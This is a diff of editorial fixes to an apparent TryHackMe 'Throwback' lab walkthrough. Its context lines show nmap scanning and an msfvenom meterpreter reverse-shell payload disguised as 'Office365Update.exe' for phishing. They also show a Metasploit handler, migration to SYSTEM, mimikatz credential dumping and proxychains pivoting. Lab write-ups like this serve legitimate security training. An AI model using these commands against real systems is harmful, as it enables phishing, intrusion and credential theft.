@@ -19,7 +19,7 @@ Let's VPN into the network and run nmap:
 nmap -sV -sC -p- -vv 10.200.19.0/24 --min-rate 5000 -oN firstScan
 ````
 
-sV and sC are very useful flags as they will try to identify services listening at port and will also some scripts to gather additional information about the host. I also asked for extra verbosity but it might have been a overkill in that situation. Here's a recap of some interesting findings by nmap:
+sV and sC are very useful flags as they will try to identify services listening at ports and will also launch some scripts to gather additional information about the host. I also asked for extra verbosity but it might have been a overkill in that case. Here's a recap of some interesting findings by nmap:
 
 - A pfsense firewall running on 10.200.19.138 that's also hosting a website.
 - A linux box on 10.200.19.177 that is listening on port 1337 (the elite port) which seems to be hosting a website but since it’s not on the tryhackme network diagram I considered it was out of scope.
@@ -255,7 +255,7 @@ Next let's take a look at the company website. There is some employees photos an
 ![Throwback hacks website](/github-pages-with-jekyll/assets/images/tb-hacks-website.png)\
 Figure 2: Throwback Hacks website
 
-Before we go any further I'll show you a slightly different network diagram notice that will help me illustrate the path I took through the network. On the diagram you can see my laptop which has VPN connection to the network. I will use the IP that correspond to tun0 (you can see that address ifconfig) when I set up reverse shell and such. The network I'm in is 10.200.19.0/24 but yours maybe different.
+Before we go any further I'll show you a slightly different network diagram that will help me illustrate the path I took through the network. On the diagram you can see my laptop which has VPN connection to the network. I will use the IP that correspond to tun0 (you can see that address with ifconfig) when I set up reverse shell and such. The network I'm in is 10.200.19.0/24 but yours maybe different.
 
 ![Throwback hacks website](/github-pages-with-jekyll/assets/images/tb-network-diagram2.png)\
 Figure 3: Network diagram from my perspective
@@ -264,7 +264,7 @@ There is multiple path to reach the Throwback domain but I will use an easy and 
 
 ## Gone phishing
 
-Before we login to the mail server and start sending phishing email, we got a little preparation to make. We will craft the malicious executable, aka payload, that we will send to our potential victims by using this command:
+Before we login to the mail server and start sending phishing emails, we got a little preparation to make. We will craft the malicious executable, aka payload, that we will send to our potential victims by using this command:
 
 ````
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe -o Office365Update.exe    
@@ -277,7 +277,7 @@ sudo msfconsole
 > use exploit/multi/handler
 ````
 
-You can type _options_ to see parameters used by the current module and _set_ to modify them. So it should look like this:
+You can type **options** to see parameters used by the current module and **set** to modify them. So it should look like this:
 
 ````
 > options
@@ -290,7 +290,7 @@ Payload options (windows/meterpreter/reverse_tcp):
    LPORT     53               yes       The listen port
 ````
 
-You can keep the values of your parameters you set using _save_. To start the handler in the background: _exploit -j_
+You can keep the values of your parameters you set using **save**. To start the handler in the background: **exploit -j**
 
 Now let’s take a look the Throwback-MAIL website.
 
@@ -330,7 +330,7 @@ meterpreter > ps
 meterpreter > migrate 2112
 ````
 
-So I checked out _sysinfo_ again and I’m now in a x64 meterpreter shell and _getuid_ indicate that I’m now running as SYSTEM. So I’m gonna load kiwi (previously known as mimikatz) and try to dump some credentials. If you never heard about mimikatz, it’s a very useful post exploitation tools that allows, among other things, to gather credentials on a windows machine:
+So I checked out **sysinfo** again and I’m now in a x64 meterpreter shell and **getuid** indicate that I’m now running as SYSTEM. So I’m gonna load kiwi (also known as mimikatz) and try to dump some credentials. If you never heard about mimikatz, it’s a very useful post exploitation tools that allows, among other things, to gather credentials on a windows machine:
 ````
 meterpreter > load kiwi
 meterpreter > help kiwi
@@ -403,20 +403,20 @@ sudo nano /etc/proxychains4.conf
 socks4 127.0.0.1 1080
 ````
 
-You can now run commands on the throwback domain by preceding your commands by proxychains. There was a lot of time when I wanted to verify if my proxychains were working, I would then use that command:
+You can now run commands on the THROWBACK domain by preceding your commands by proxychains. There was a lot of time when I wanted to verify if my proxychains were working, I would then use that command:
 
 ````
 proxychains nmap -Pn -sT -p22 10.200.19.222
 ````
 
-If the port is open then your proxychains is working and you are now in the Throwback domain!
+If the port is open then your proxychains is working and you are now in the THROWBACK domain!
 
 ## Conclusion
 
 This post was only a brief introduction to the Throwback network. If you hack the other boxes in the DMZ you will see a lot of fun stuff: default credentials, remote code execution, LLMNR poisoning, password spraying with hydra and so on.
 
- The hardest part for me was pivoting around the network and it's not over for you yet, rembember you still have to access the corporate domain. There is plenty of fun stuff you still have to see: bloodhound, kerberoasting, OSINT and even crafting an excel file with a malicious macro inside.
+ It's not over for you yet, rembember you still have to access the CORPORATE domain. There is plenty of fun stuff you still have to see: bloodhound, kerberoasting, OSINT and even crafting an excel file with a malicious macro inside.
 
- Finally, I'll just give you a quick hint if you have difficulty entering the last domain. I had some troubles setting up my proxychains for it and my ssh connection were refused. So I used the previous proxychains with xfreedrdp to connect to Throwback-DC01 and then I used Windows Remote Desktop to connect to Corporate DC01. Oh well, whatever works!
+ I had some troubles setting up my proxychains to pivot to the last domain and my ssh connection were refused. So I'll just tell you what I worked for me: I used the previous proxychains with xfreedrdp to connect to Throwback-DC01 and then I used Windows Remote Desktop to connect to Corporate DC01. Oh well, whatever works!
 
- That was the first time I had to pivot into a network and I felt my grip was loosening as I went deeper into the network. Network segmentation adds another layer of security and help protect those assets. Have a good time hacking networks and always strive to make the internet a safer place.
+ That was the first time I had to pivot into a network and I felt my grip was loosening as I went deeper into the network. Network segmentation adds another layer of security and helps protect assets. Until next time, strive to make the internet a safer place and have fun hacking networks!
